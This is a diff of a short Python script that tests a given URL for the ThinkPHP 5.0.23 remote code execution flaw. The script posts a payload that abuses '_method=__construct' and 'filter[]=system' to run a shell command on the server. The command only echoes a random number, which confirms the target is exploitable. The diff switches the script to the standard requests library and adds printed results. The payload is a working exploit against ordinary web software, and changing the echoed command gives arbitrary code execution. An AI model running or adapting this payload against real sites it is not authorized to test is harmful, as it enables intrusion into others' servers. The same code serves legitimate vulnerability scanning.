@@ -1,22 +1,24 @@
 # coding=utf-8
-import random
+import random,sys
 
-from lib.Requests import Requests
-import Requests
+#from lib.Requests import Requests
+import requests
 vuln = ['ThinkPHP', 'ThinkSNS']
 random_num = ''.join(str(i) for i in random.sample(range(0, 9), 8))
 
 print('[*]Usage: [URL]')
 def check(url):
-    req = Requests()
+    #req = Requests()
     payload = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "{}"'.format(random_num)
     try:
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        r = req.request(url + '/index.php?s=captcha', 'post', data=payload, headers=headers, verify=False)
+        r = requests.post(url + '/index.php?s=captcha', data=payload, headers=headers, verify=False)
         if random_num in r.text:
-            return 'thinkphp_5_0_23_rce | ' + url
+            print('[+]thinkphp_5_0_23_rce | ' + url)
+        else:
+            print('[-]target is not vulnerable')
     except Exception as e:
-        pass
+        print("异常对象的内容是%s"%e)
 
 if __name__ == '__main__':
     url = sys.argv[1]
